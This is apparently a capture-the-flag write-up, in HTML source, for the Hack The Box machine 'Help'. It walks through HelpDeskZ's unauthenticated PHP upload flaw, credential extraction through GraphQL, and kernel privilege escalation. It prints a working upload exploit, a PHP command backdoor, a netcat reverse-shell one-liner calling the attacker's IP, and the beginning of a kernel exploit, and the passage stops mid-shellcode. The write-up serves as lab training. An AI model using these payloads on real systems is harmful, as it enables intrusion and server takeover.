-&lt;h4 id=&quot;hey-guys-today-help-retired-and-heres-my-write-up-about-it-help-was-a-nice-easy-machine-i-dont-really-have-much-to-say-about-it-to-get-an-initial-shell-on-the-box-we-will-exploit-a-non-authenticated-file-upload-vulnerability-in-a-web-application-called-helpdeskz-this-vulnerability-could-be-exploited-in-two-ways-either-by-editing-the-exploit-to-include-a-higher-range-or-by-getting-credentials-to-the-web-app-and-editing-some-settings-to-make-the-exploit-work-after-getting-a-shell-the-privilege-escalation-part-is-just-a-kernel-exploit-its-a-linux-box-and-its-ip-is-101010121-i-added-it-to-etchosts-as-helphtb-lets-jump-right-in-&quot;&gt;Hey guys today Help retired and here’s my write-up about it. Help was a nice easy machine, I don’t really have much to say about it. To get an initial shell on the box we will exploit a non-authenticated file upload vulnerability in a web application called &lt;code class=&quot;highlighter-rouge&quot;&gt;HelpDeskZ&lt;/code&gt;. This vulnerability could be exploited in two ways either by editing the exploit to include a higher range or by getting credentials to the web app and editing some settings to make the exploit work. After getting a shell the privilege escalation part is just a kernel exploit. It’s a Linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.121&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;help.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
-&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC help.htb&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/help/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-got-ssh-on-port-22-and-http-on-two-ports--80-and-3000-whats-running-on-port-80-is-an-apache2-server-and-on-port-3000-is-nodejs-express-framework&quot;&gt;We got &lt;code class=&quot;highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on port 22 and &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; on two ports : 80 and 3000. What’s running on port 80 is an &lt;code class=&quot;highlighter-rouge&quot;&gt;Apache2&lt;/code&gt; server and on port 3000 is &lt;code class=&quot;highlighter-rouge&quot;&gt;Node.js Express Framework&lt;/code&gt;.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
-&lt;h4 id=&quot;on-port-80-theres-just-the-default-apache-index-page-&quot;&gt;On port 80 there’s just the default &lt;code class=&quot;highlighter-rouge&quot;&gt;Apache&lt;/code&gt; index page :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;so-i-ran-gobuster-and-got-these-results-&quot;&gt;So I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and got these results :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster -u http://help.htb/ -w /usr/share/wordlists/dirb/common.txt&lt;/code&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;=====================================================
-Gobuster v2.0.0              OJ Reeves (@TheColonial)
-=====================================================
-[+] Mode         : dir
-[+] Url/Domain   : http://help.htb/
-[+] Threads      : 10
-[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
-[+] Status codes : 200,204,301,302,307,403
-[+] Timeout      : 10s
-=====================================================
-2019/06/07 13:03:25 Starting gobuster
-=====================================================
-/.hta (Status: 403)
-/.htpasswd (Status: 403)
-/.htaccess (Status: 403)
-/index.html (Status: 200)
-/javascript (Status: 301)
-/server-status (Status: 403)
-/support (Status: 301)
-=====================================================
-2019/06/07 13:05:25 Finished
-=====================================================
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;i-went-to-support-and-there-was-a-web-application-called-helpdeskz-&quot;&gt;I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;/support&lt;/code&gt; and there was a web application called &lt;code class=&quot;highlighter-rouge&quot;&gt;HelpDeskZ&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;file-upload-vulnerability&quot;&gt;File Upload Vulnerability&lt;/h3&gt;
-&lt;h4 id=&quot;a-quick-search-and-i-found-an-unauthenticated-file-upload-vulnerability-that-takes-advantage-of-the-weak-file-renaming-function-thats-responsible-for-renaming-tickets-attachments-and-the-ability-to-upload-php-files-because-they-are-allowed-by-default&quot;&gt;A quick search and I found an &lt;a href=&quot;https://www.exploit-db.com/exploits/40300&quot;&gt;unauthenticated file upload vulnerability&lt;/a&gt; that takes advantage of the weak file renaming function that’s responsible for renaming tickets attachments and the ability to upload &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; files because they are allowed by default.&lt;/h4&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;HelpDeskZ = v1.0.2 suffers from an unauthenticated shell upload vulnerability.
-The software in the default configuration allows upload for .php-Files ( !! ). I think the developers thought it was no risk, because the filenames get obfuscated when they are uploaded. However, there is a weakness in the rename function of the uploaded file. -&lt;a href=&quot;https://www.exploit-db.com/exploits/40300&quot;&gt;exploit-db&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h4 id=&quot;i-wanted-to-test-if-i-can-really-upload-php-so-i-went-to-submit-a-ticket-and-i-attached-a-test-file-&quot;&gt;I wanted to test if I can really upload &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; so I went to &lt;code class=&quot;highlighter-rouge&quot;&gt;Submit a Ticket&lt;/code&gt; and I attached a test file :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/4.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/help/5.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/help/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;and-i-got-file-is-not-allowed&quot;&gt;And I got &lt;code class=&quot;highlighter-rouge&quot;&gt;File is not allowed.&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;luckily-helpdeskz-is-an-open-source-application-so-i-checked-the-source-on-github&quot;&gt;Luckily &lt;code class=&quot;highlighter-rouge&quot;&gt;HelpDeskZ&lt;/code&gt; is an open-source application so I checked the source on &lt;a href=&quot;https://github.com/evolutionscript/HelpDeskZ-1.0&quot;&gt;github&lt;/a&gt;.&lt;/h4&gt;
-&lt;h4 id=&quot;the-script-that-handles-tickets-submissions-is-called-new-ticketphp-it-can-be-found-in-includesparser&quot;&gt;The script that handles tickets submissions is called &lt;a href=&quot;https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/parser/new_ticket.php&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;new-ticket.php&lt;/code&gt;&lt;/a&gt;. It can be found in &lt;code class=&quot;highlighter-rouge&quot;&gt;includes/parser&lt;/code&gt;.&lt;/h4&gt;
-&lt;h4 id=&quot;heres-the-part-for-the-attachments-&quot;&gt;Here’s the part for the attachments :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(is_array($attachments)){
-		$save_dir = UPLOAD_DIR;
-		foreach($attachments as $attachment) {
-		  // get the attachment name
-		  $filename = $attachment-&amp;gt;filename;
-		  // write the file to the directory you want to save it in
-		  if ($fp = fopen($save_dir.$filename, 'w')) {
-			while($bytes = $attachment-&amp;gt;read()) {
-			  fwrite($fp, $bytes);
-			}
-			fclose($fp);
-		  }
-			
-		  $filesize = @filesize(UPLOAD_DIR.$filename);
-		  if($filesize){
-			  $fileinfo = array('name' =&amp;gt; $filename, 'size' =&amp;gt; $filesize);
-			  $fileverification = verifyAttachment($fileinfo);
-			  if($fileverification['msg_code'] == 0){
-				$ext = pathinfo($filename, PATHINFO_EXTENSION);
-				$filename_encoded = md5($filename.time()).&quot;.&quot;.$ext;
-				$data = array('name' =&amp;gt; $filename, 'enc' =&amp;gt; $filename_encoded, 'filesize' =&amp;gt; $filesize, 'ticket_id' =&amp;gt; $ticketid, 'msg_id' =&amp;gt; $message_id, 'filetype' =&amp;gt; $attachment-&amp;gt;content_type);
-				$db-&amp;gt;insert(TABLE_PREFIX.&quot;attachments&quot;, $data);
-				rename(UPLOAD_DIR.$filename, UPLOAD_DIR.'tickets/'.$filename_encoded);
-			  }else{
-				unlink(UPLOAD_DIR.$filename);
-			  }
-		  }
-		}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;it-takes-the-file-and-uploads-it-then-theres-an-if-statement-that-checks-the-result-of-passing-fileinfo-to-a-function-called-verifyattachment-if-the-function-returned-0-it-will-rename-the-file-if-its-not-0-it-will-delete-the-file-unlinkupload_dirfilename--this-function-can-be-found-in-functionsphp-in-includes&quot;&gt;It takes the file and uploads it then there’s an &lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt; statement that checks the result of passing &lt;code class=&quot;highlighter-rouge&quot;&gt;$fileinfo&lt;/code&gt; to a function called &lt;code class=&quot;highlighter-rouge&quot;&gt;verifyAttachment&lt;/code&gt;. If the function returned &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; it will rename the file. If it’s not &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; it will delete the file (&lt;code class=&quot;highlighter-rouge&quot;&gt;unlink(UPLOAD_DIR.$filename)&lt;/code&gt;) . This function can be found in &lt;a href=&quot;https://github.com/evolutionscript/HelpDeskZ-1.0/blob/master/includes/functions.php&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;functions.php&lt;/code&gt;&lt;/a&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;includes/&lt;/code&gt;.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;verifyAttachment()&lt;/code&gt; :
-&lt;img src=&quot;/images/hackthebox/help/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;function verifyAttachment($filename){
-	global $db;	
-	$namepart = explode('.', $filename['name']);
-	$totalparts = count($namepart)-1;
-	$file_extension = $namepart[$totalparts];
-	if(!ctype_alnum($file_extension)){
-		$msg_code = 1;
-	}else{
-		$filetype = $db-&amp;gt;fetchRow(&quot;SELECT count(id) AS total, size FROM &quot;.TABLE_PREFIX.&quot;file_types WHERE type='&quot;.$db-&amp;gt;real_escape_string($file_extension).&quot;'&quot;);
-		if($filetype['total'] == 0){
-			$msg_code = 2;
-		}elseif($filename['size'] &amp;gt; $filetype['size'] &amp;amp;&amp;amp; $filetype['size'] &amp;gt; 0){
-			$msg_code = 3;
-			$misc = formatBytes($filetype['size']);
-		}else{	
-			$msg_code = 0;
-		}
-	}
-	$data = array('msg_code' =&amp;gt; $msg_code, 'msg_extra' =&amp;gt; $misc);
-	return $data;
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;this-function-runs-several-checks-on-the-file-but-interestingly-it-doesnt-check-for-allowed-file-extensions-this-means-that-if-the-file-passed-these-checks-the-function-will-return-0-and-the-file-will-be-renamed-and-successfully-uploaded-no-matter-whats-the-extension-of-that-file-and-the-message-that-says--file-is-not-allowed-is-meaningless&quot;&gt;This function runs several checks on the file, but interestingly it doesn’t check for allowed file extensions. This means that if the file passed these checks the function will return &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; and the file will be renamed and successfully uploaded no matter what’s the extension of that file and the message that says : &lt;code class=&quot;highlighter-rouge&quot;&gt;File is not allowed.&lt;/code&gt; is meaningless.&lt;/h4&gt;
-&lt;h4 id=&quot;if-we-take-a-look-at-how-the-application-renames-files-it-gets-the-md5-hash-of-the-filename-concatenated-with-the-time-of-upload-then-it-concatenates-that-hash-with-the-original-file-extension-and-thats-how-the-exploit-finds-the-uploaded-file-but-theres-a-small-problem-about-time-running-the-exploit-on-our-box-would-use-our-local-time-if-the-timezone-of-the-web-app-is-different-from-the-timezone-of-our-box-the-exploit-will-fail-to-find-the-file-because-it-will-use-a-wrong-time&quot;&gt;If we take a look at how the application renames files it gets the md5 hash of the filename concatenated with the time of upload then it concatenates that hash with the original file extension. And that’s how the exploit finds the uploaded file. But there’s a small problem about time, running the exploit on our box would use our local time. If the timezone of the web app is different from the timezone of our box the exploit will fail to find the file because it will use a wrong time.&lt;/h4&gt;
-&lt;h4 id=&quot;if-we-take-a-look-at-the-exploit-&quot;&gt;If we take a look at the exploit :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import hashlib
-import time
-import sys
-import requests
-
-print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'
-
-if len(sys.argv) &amp;lt; 3:
-    print &quot;Usage: {} [baseUrl] [nameOfUploadedFile]&quot;.format(sys.argv[0])
-    sys.exit(1)
-
-helpdeskzBaseUrl = sys.argv[1]
-fileName = sys.argv[2]
-
-currentTime = int(time.time())
-
-for x in range(0, 300):
-    plaintext = fileName + str(currentTime - x)
-    md5hash = hashlib.md5(plaintext).hexdigest()
-
-    url = helpdeskzBaseUrl+md5hash+'.php'
-    response = requests.head(url)
-    if response.status_code == 200:
-        print &quot;found!&quot;
-        print url
-        sys.exit(0)
-
-print &quot;Sorry, I did not find anything&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;we-can-solve-this-problem-by-iterating-over-a-higher-range-than-300--for-x-in-range0-300&quot;&gt;We can solve this problem by iterating over a higher range than 300 : &lt;code class=&quot;highlighter-rouge&quot;&gt;for x in range(0, 300)&lt;/code&gt;&lt;/h4&gt;
-&lt;h4 id=&quot;this-will-make-it-try-different-hashes-according-to-different-times-until-it-finds-the-file-you-can-call-it-a-bruteforce-attack-that-will-be-easy-lets-look-at-another-solution-another-solution-is-to-get-credentials-to-login-to-the-web-app-and-edit-the-timezone-in-the-settings-to-make-it-the-same-as-ours&quot;&gt;This will make it try different hashes according to different times until it finds the file, you can call it a bruteforce attack. That will be easy let’s look at another solution. Another solution is to get credentials to login to the web app and edit the timezone in the settings to make it the same as ours.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;nodejs-getting-credentials&quot;&gt;Node.js, Getting Credentials&lt;/h3&gt;
-&lt;h4 id=&quot;we-saw-earlier-that-port-3000-was-open-and-running-nodejs-express-framework-and-we-havent-looked-at-that-yet&quot;&gt;We saw earlier that port 3000 was open and running &lt;code class=&quot;highlighter-rouge&quot;&gt;Node.js Express framework&lt;/code&gt; and we haven’t looked at that yet.&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;by-going-to-httphelphtb3000-i-got-this-response-of-a-message-saying--hi-shiv-to-get-access-please-find-the-credentials-with-given-query-i-tried-test-and-got-this-&quot;&gt;By going to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/&lt;/code&gt; I got this response of a message saying : &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;Hi Shiv, To get access please find the credentials with given query&quot;&lt;/code&gt;, I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;/test&lt;/code&gt; and got this :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;tbh-the-next-step-involved-a-lot-of-guessingfuzzing-with-custom-wordlists-and-random-things-based-on-google-searches-about-nodejs-nodejs-queries-and-other-related-stuff-after-a-lot-of-attempts-to-find-something-when-i-tried-graphql-i-got-this-response-&quot;&gt;tbh the next step involved a lot of guessing/fuzzing with custom wordlists and random things based on google searches about &lt;code class=&quot;highlighter-rouge&quot;&gt;node.js&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;node.js&lt;/code&gt; queries and other related stuff. After a lot of attempts to find something when I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;/graphql&lt;/code&gt; I got this response :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;so-i-added-query--httphelphtb3000graphqlquery-and-got-a-syntax-error-&quot;&gt;So I added &lt;code class=&quot;highlighter-rouge&quot;&gt;?query&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/graphql?query&lt;/code&gt; and got a syntax error :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;thats-fine-i-tried-requesting-a-query-for-example-user--httphelphtb3000graphqlqueryuser-&quot;&gt;That’s fine, I tried requesting a query, for example &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/graphql?query={user}&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;it-says-that-user-must-have-a-selection-of-subfields-so-i-tried-username--httphelphtb3000graphqlqueryuserusername-&quot;&gt;It says that &lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; must have a selection of subfields so I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;username&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/graphql?query={user{username}}&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;great-lets-get-the-password--httphelphtb3000graphqlqueryuserpassword-&quot;&gt;Great, let’s get the password : &lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb:3000/graphql?query={user{password}}&lt;/code&gt; :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;i-used-crackstation-to-crack-the-hash-and-got-this-password-&quot;&gt;I used &lt;a href=&quot;https://crackstation.net/&quot;&gt;crackstation&lt;/a&gt; to crack the hash and got this password :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;5d3c93182bb20f07b994a7f617e99cff&lt;/code&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;godhelpmeplz&lt;/code&gt;&lt;/p&gt;
-&lt;h4 id=&quot;now-we-have-the-credentials--helpmehelpmecom--godhelpmeplz&quot;&gt;Now we have the credentials : &lt;code class=&quot;highlighter-rouge&quot;&gt;helpme@helpme.com : godhelpmeplz&lt;/code&gt;&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;file-upload-exploitation-reverse-shell-and-user-flag&quot;&gt;File Upload Exploitation, Reverse Shell and User Flag&lt;/h3&gt;
-&lt;h4 id=&quot;i-edited-the-path-of-the-uploads-in-the-exploit-instead-of-helpdeskzbaseurlmd5hashphp-i-made-it-helpdeskzbaseurluploadsticketsmd5hashphp-i-got-this-path-from-the-github-repository-exploit-after-edits-&quot;&gt;I edited the path of the uploads in the exploit, instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;helpdeskzBaseUrl+md5hash+'.php'&lt;/code&gt; I made it &lt;code class=&quot;highlighter-rouge&quot;&gt;helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'&lt;/code&gt; (I got this path from the &lt;a href=&quot;https://github.com/evolutionscript/HelpDeskZ-1.0&quot;&gt;github repository&lt;/a&gt;). Exploit after edits :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import hashlib
-import time
-import sys
-import requests
-
-print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'
-
-if len(sys.argv) &amp;lt; 3:
-    print &quot;Usage: {} [baseUrl] [nameOfUploadedFile]&quot;.format(sys.argv[0])
-    sys.exit(1)
-
-helpdeskzBaseUrl = sys.argv[1]
-fileName = sys.argv[2]
-
-currentTime = int(time.time())
-
-for x in range(0, 300):
-    plaintext = fileName + str(currentTime - x)
-    md5hash = hashlib.md5(plaintext).hexdigest()
-
-    url = helpdeskzBaseUrl+'/uploads/tickets/'+md5hash+'.php'
-    response = requests.head(url)
-    if response.status_code == 200:
-        print &quot;found!&quot;
-        print url
-        sys.exit(0)
-
-print &quot;Sorry, I did not find anything&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;i-went-to-the-settings-and-changed-the-timezone-to-the-same-timezone-as-mine-&quot;&gt;I went to the settings and changed the timezone to the same timezone as mine :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;the-php-file-im-going-to-upload-is-simple-backdoorphp-which-can-be-found-in-usrsharewebshellsphpsimple-backdoorphp-in-kali-&quot;&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;php&lt;/code&gt; file I’m going to upload is &lt;code class=&quot;highlighter-rouge&quot;&gt;simple-backdoor.php&lt;/code&gt; which can be found in &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/share/webshells/php/simple-backdoor.php&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;kali&lt;/code&gt; :&lt;/h4&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&amp;gt;
-
-&amp;lt;?php
-
-if(isset($_REQUEST['cmd'])){
-        echo &quot;&amp;lt;pre&amp;gt;&quot;;
-        $cmd = ($_REQUEST['cmd']);
-        system($cmd);
-        echo &quot;&amp;lt;/pre&amp;gt;&quot;;
-        die;
-}
-
-?&amp;gt;
-
-Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
-
-&amp;lt;!--    http://michaeldaw.org   2006    --&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h4 id=&quot;i-submitted-the-ticket-&quot;&gt;I submitted the ticket :&lt;/h4&gt;
-&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-i-ran-the-exploit-and-it-found-the-file-immediately-&quot;&gt;Then I ran the exploit and it found the file immediately :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;python exploit.py http://10.10.10.121/support/ rick.php&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/help/18.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/help/19.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd=whoami&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/help/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;its-working-lets-get-a-reverse-shell-i-used-this-payload--rm-tmpfmkfifo-tmpfcat-tmpfbinsh--i-21nc-1010xxxx-1337-tmpf-url-encoded&quot;&gt;It’s working, let’s get a reverse shell, I used this payload : &lt;code class=&quot;highlighter-rouge&quot;&gt;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.xx.xx 1337 &amp;gt;/tmp/f&lt;/code&gt; (url encoded)&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://help.htb/support/uploads/tickets/11559b997fcb9a724cbc0e2a6a4b98a3.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.xx.xx%201337%20%3E%2Ftmp%2Ff&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/help/21.png&quot; alt=&quot;&quot; /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;img src=&quot;/images/hackthebox/help/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;we-owned-user&quot;&gt;We owned user.&lt;/h4&gt;
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;kernel-exploit-privilege-escalation-and-root-flag&quot;&gt;Kernel Exploit, Privilege Escalation and Root Flag&lt;/h3&gt;
-&lt;h4 id=&quot;privilege-escalation-on-this-machine-was-very-easy-just-a-kernel-exploit-one-of-the-first-things-to-check-after-getting-a-shell-is-the-system-info-&quot;&gt;Privilege escalation on this machine was very easy, just a kernel exploit. One of the first things to check after getting a shell is the system info :&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;uname -a&lt;/code&gt;
-&lt;img src=&quot;/images/hackthebox/help/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;that-kernel-version-is-vulnerable-to-a-local-privilege-escalation-vulnerability-and-theres-an-exploit-published-for-it&quot;&gt;That kernel version is vulnerable to a local privilege escalation vulnerability and there’s an &lt;a href=&quot;https://www.exploit-db.com/exploits/44298&quot;&gt;exploit&lt;/a&gt; published for it.&lt;/h4&gt;
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit.c&lt;/code&gt; :&lt;/p&gt;
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
-#include &amp;lt;stdlib.h&amp;gt;
-#include &amp;lt;unistd.h&amp;gt;
-#include &amp;lt;errno.h&amp;gt;
-#include &amp;lt;fcntl.h&amp;gt;
-#include &amp;lt;string.h&amp;gt;
-#include &amp;lt;linux/bpf.h&amp;gt;
-#include &amp;lt;linux/unistd.h&amp;gt;
-#include &amp;lt;sys/mman.h&amp;gt;
-#include &amp;lt;sys/types.h&amp;gt;
-#include &amp;lt;sys/socket.h&amp;gt;
-#include &amp;lt;sys/un.h&amp;gt;
-#include &amp;lt;sys/stat.h&amp;gt;
-#include &amp;lt;stdint.h&amp;gt;
-
-#define PHYS_OFFSET 0xffff880000000000
-#define CRED_OFFSET 0x5f8
-#define UID_OFFSET 4
-#define LOG_BUF_SIZE 65536
-#define PROGSIZE 328
-
-int sockets[2];
-int mapfd, progfd;
-
-char *__prog = 	&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;
-		&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;
-		&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;
-		&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;
-		&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;
